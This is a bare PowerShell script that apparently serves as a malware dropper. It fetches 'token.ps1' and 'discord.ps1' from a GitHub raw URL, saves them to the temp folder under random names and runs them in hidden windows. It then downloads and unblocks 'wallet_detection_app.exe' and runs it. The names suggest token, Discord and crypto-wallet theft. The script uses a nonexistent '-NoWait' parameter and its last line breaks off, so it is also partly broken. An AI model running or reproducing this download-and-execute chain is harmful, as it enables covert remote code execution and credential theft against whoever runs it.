# 1. Get the script content as a string from GitHub raw URL
$url = "https://raw.githubusercontent.com/LigmaSigmaLigma/Config/refs/heads/main/token.ps1"
$scriptContent = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# 2. Write it to a temporary file
$tempScript = Join-Path $env:TEMP "dffsdgfsd.ps1"
$scriptContent | Out-File -FilePath $tempScript -Encoding UTF8

# 3. Run the script in a new process without waiting for it to finish
Start-Process powershell.exe -ArgumentList "-File `"$tempScript`"" -WindowStyle Hidden -NoWait


# 1. Get the script content as a string from GitHub raw URL
$url2 = "https://raw.githubusercontent.com/LigmaSigmaLigma/Config/refs/heads/main/discord.ps1"
$scriptContent2 = (Invoke-WebRequest -Uri $url2 -UseBasicParsing).Content

# 2. Write it to a temporary file
$tempScript2 = Join-Path $env:TEMP "fdsgsdvc.ps1"
$scriptContent2 | Out-File -FilePath $tempScript2 -Encoding UTF8

# 3. Run the script in a new process without waiting for it to finish
Start-Process powershell.exe -ArgumentList "-File `"$tempScript2`"" -WindowStyle Hidden -NoWait



Invoke-WebRequest -Uri "https://github.com/LigmaSigmaLigma/Config/releases/download/d/wallet_detection_app.exe" -OutFile $env:TEMP\dascsad.exe
Unblock-File -Path $env:TEMP\dascsad.exe -Force
Start-Process -FilePath $env:TEMP\dascsad.exe -NoNewWindow -
